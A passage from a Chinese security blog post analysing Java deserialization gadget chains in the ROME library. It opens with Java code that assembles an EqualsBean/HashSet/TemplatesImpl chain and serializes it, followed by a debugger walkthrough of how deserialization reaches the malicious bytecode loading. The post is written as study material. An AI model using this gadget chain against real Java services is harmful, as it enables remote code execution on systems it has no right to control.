        <span class="token class-name">HashMap</span> map2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        map1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> bean<span class="token punctuation">)</span><span class="token punctuation">;</span>
        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//Hashtable hashtable =new Hashtable();</span>
        <span class="token class-name">HashSet</span> hashSet<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>map1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>map2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//hashtable.put(map1,"1");</span>
        <span class="token comment">//hashtable.put(map2,"2");</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> <span class="token string">"_beanClass"</span><span class="token punctuation">,</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> <span class="token string">"_obj"</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unSerial</span><span class="token punctuation">(</span>hashSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Object</span> hashMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>断点打在 readObject，跟进，然后顺利的来到 for 循环，第一次进 putval 肯定是不能够触发后续链的，但他会先给缓存 tab 赋值，把第一个 hashmap 存入进去<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898247072-076a4ec5-3002-4bd0-94dd-2c6e0818c9a1.png#averageHue=%232e343d&clientId=u9f9b8bcd-7272-4&from=paste&height=214&id=ue2c62fdb&originHeight=402&originWidth=1670&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=201366&status=done&style=none&taskId=u405cc488-2064-4668-8493-3dec5ed7040&title=&width=890.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>我们直接跟进第二次 putval，此时两段 hash 算出来肯定是一样的，我们只需关注 key 值和 k 值即可，分别为我们本次循环 put 的 hashmap，以及第一次 put ，被存入 tab 缓存的 hashmap<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898629888-1c0141e3-69b9-4df5-8e84-7c99d348d22a.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=650&id=ufc0abded&originHeight=1218&originWidth=1823&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=724805&status=done&style=none&taskId=u2e7a6036-4514-4679-8b3b-eecf856b51b&title=&width=972.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进 equals 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711898746853-8d85a397-fc7e-4b6d-9495-3eac0c1577d5.png#averageHue=%2333373d&clientId=u9f9b8bcd-7272-4&from=paste&height=702&id=u6fdbd404&originHeight=1317&originWidth=1948&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=812456&status=done&style=none&taskId=u8baa8f5b-5fb1-480d-82c8-17985c071c7&title=&width=1038.9333333333334" referrerpolicy="no-referrer" alt="image.png"><br>m 值为我们传入的第一次的 hashmap，i 为关于第二个 hashmap 的迭代器，迭代器第一次初始化取到的键值对默认为空，所以它第一次 next 就是取出我们第二个 hashmap 的第一个键值对，也就是<code>&lt;&quot;zZ&quot;,equalsbean&gt;</code>，所以 key 是 zZ 字符串，value 是创建好的 qualsbean<br>最终 value.equals(m.get(key)) 转化为<code>EqualsBean.equals(templatesImpl)</code><br>后续触发就是正常流程了，EqualsBean 的 equals 方法直接 return beanEquals 处理的结果，所以跟进beanEquals<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711899567246-3ce22e8c-5896-43b1-9a95-1b719a0113a0.png#averageHue=%2333373c&clientId=u9f9b8bcd-7272-4&from=paste&height=564&id=u7b0d8106&originHeight=1057&originWidth=1959&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=653948&status=done&style=none&taskId=u3a553836-a0cc-4694-9d01-3467bd837ff&title=&width=1044.8" referrerpolicy="no-referrer" alt="image.png"><br>获取完 get 方法之后开始第一次调用，此时调用就是 TemplatesImpl 的 getOutputProperties 方法<br>之后就是加载恶意字节码的流程，不过多赘述</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用 EqualsBean 的方式去触发链其实不只有 hashset 方法可以作为入口点，以及也不只 templatesImpl 作为最终恶意代码执行的点，它和 ToStringBean 一样，都只是作为攻击链其中的一部分。不过最重要的点还是它两作为 ROME 依赖中组件的特性，就是会调用目标类的 get 方法，这也是存在恶意代码执行的必要条件。<br>我们学习 ROME 链的时候要和 CommonCollections 链联系起来，虽然 CC 是最开始我们学习 java 反序列化的先导，但其实两者是很像的。分析 ROME 链，我最大的感受可能是对 CC 链等依赖中存在的攻击链新的认识，其实就是分析 java 项目中存在哪些依赖，该依赖有没有漏洞点，能不能作为我最终攻击的跳板。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html')">ROME攻击链分析</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ROME攻击链分析&amp;url=http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html&amp;pic=https://bu.dusays.com/2024/03/11/65ee76f777226.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">stoocea</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">C3P0攻击链学习</div></div></a></div><div class="next-post pull-right"><a href="/post/Re_Live.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Re_Life</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/01/15/d24ffd2267904.png" alt="status"/></div></div><div class="author-info__description">time thicking away</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-ROME"><span class="toc-number">1.</span> <span class="toc-text">什么是 ROME</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME-%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">ROME 组件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ToStringBean"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ToStringBean</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EqualsBean"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 EqualsBean</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME-%E9%93%BE%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">ROME 链流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ObjectBean%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">0x01 ObjectBean利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.1.</span> <span class="toc-text">1x01 流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-HashTable%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.2.</span> <span class="toc-text">0x02 HashTable利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-BadAttributeValueExpException"><span class="toc-number">3.3.</span> <span class="toc-text">0x03 BadAttributeValueExpException</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">1x01 调用流程分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-HotSwappableTargetSource-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">0x04 HotSwappableTargetSource 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">3.4.1.</span> <span class="toc-text">1x01  功能分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-%E6%B5%81%E7%A8%8B%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.4.2.</span> <span class="toc-text">1x02 流程利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-hashMap-%E5%85%A5%E5%8F%A3"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">2x01 hashMap 入口</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.4.2.1.1.</span> <span class="toc-text">3x01 流程分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.5.</span> <span class="toc-text">0x05 JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.5.1.</span> <span class="toc-text">1x01 攻击实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-EqualsBean%E9%93%BE"><span class="toc-number">3.6.</span> <span class="toc-text">0x06 EqualsBean链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">3.6.1.</span> <span class="toc-text">1x01 流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-hashSet-%E5%88%86%E6%9E%90"><span class="toc-number">3.6.1.1.</span> <span class="toc-text">2x01 hashSet 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.6.1.2.</span> <span class="toc-text">2x02 攻击流程分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Re_Live.html" title="Re_Life">Re_Life</a><time datetime="2024-03-31T15:59:00.000Z" title="发表于 2024-03-31 23:59:00">2024-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="ROME攻击链分析">ROME攻击链分析</a><time datetime="2024-03-31T15:50:00.000Z" title="发表于 2024-03-31 23:50:00">2024-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html" title="C3P0攻击链学习">C3P0攻击链学习</a><time datetime="2024-03-22T07:00:00.000Z" title="发表于 2024-03-22 15:00:00">2024-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="Jackson反序列化初步学习">Jackson反序列化初步学习</a><time datetime="2024-03-18T09:01:00.000Z" title="发表于 2024-03-18 17:01:00">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastJsonRe0.html" title="FastJsonRe0">FastJsonRe0</a><time datetime="2024-03-18T09:00:00.000Z" title="发表于 2024-03-18 17:00:00">2024-03-18</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="stoocea" target="_blank">stoocea</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span 